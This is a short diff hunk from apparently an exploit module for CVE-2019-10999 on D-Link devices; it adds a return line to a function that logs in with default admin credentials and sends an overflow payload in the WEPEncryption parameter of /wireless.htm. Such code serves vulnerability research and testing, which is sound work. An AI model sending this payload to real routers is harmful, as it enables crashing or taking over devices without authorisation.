@@ -16,3 +16,4 @@ def dlink_cve_2019_10999(ip):
 	session.auth = ('admin', '')
 	data = '?WEPEncryption=' + 'A' * 0x28 + 'B' * 0x4
 	res = session.get(url='http://' + ip + '/wireless.htm' + data, headers=headers)
+	return res
